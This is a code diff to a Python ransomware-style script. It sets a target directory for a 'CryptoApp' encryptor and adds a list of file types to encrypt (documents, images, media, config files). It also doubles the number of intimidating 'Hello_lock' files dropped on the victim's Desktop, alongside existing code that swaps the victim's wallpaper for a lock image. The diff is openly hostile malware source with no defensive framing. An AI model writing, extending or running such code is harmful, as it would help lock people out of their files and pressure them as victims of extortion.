@@ -4,23 +4,40 @@ import os
 import json
 from operator import itemgetter
 import glob
+from sys import argv
 
 
+
+# Get the starting path
+# Otherwise start from the current directory
+try:
+    START_PATH = argv[1] if os.path.isdir(argv[1]) else os.getcwd()
+except IndexError:
+    START_PATH = os.getcwd()
+
+
+# Variables that must be initialized before CryptoApp constructor
 JSON_PATH = 'info.json'
+lock_wallpaper = os.path.realpath('locked.jpg')
 
 # Init the APP, do not encrypt these files specified in a constructor
-APP = CryptoApp([
-    JSON_PATH,
-    '__pycache__',
-    'locked.jpg'
-])
+APP = CryptoApp(START_PATH)
 
+# Set the initial options
+APP.setFilesToSkip([JSON_PATH, '__pycache__', 'locked.jpg'])
+APP.setExtensionsToModify([
+    '.txt', '.docx', '.odt',
+    '.jpg', '.png', '.jpeg', '.gif',
+    '.mp3', '.mp4', '.avi', 
+    '.json', '.conf'
+])
 
 # Init the variables
 target_os, target_de = itemgetter('os', 'de')(APP.determineOS())
 new_wallpaper = None
 extra_files_name = 'Hello_lock'
 desktop_path = os.path.expanduser('~/Desktop')
+
 
 
 if APP.isAlreadyEncrypted():
@@ -65,17 +82,16 @@ else:
         asJSON["original_background"] = currentBG
     
     # Locked screen wallpaper
-    if os.path.isfile('locked.jpg'):
-        new_wallpaper = 'locked.jpg'
+    if os.path.isfile(lock_wallpaper):
+        new_wallpaper = lock_wallpaper
 
     # Create and save the JSON
     j = json.dumps(asJSON, indent=4)
     APP.writeFile(JSON_PATH, j)
 
-    # Create some intimidating files on Desktop
-    for i in range(0, 51):
+    # Create on Desktop some intimidating files
+    for i in range(0, 101):
         APP.writeFile(f'{desktop_path}/{extra_files_name}{i}.txt', 'Hello')
-
 
 
 # Change the victim's wallpaper
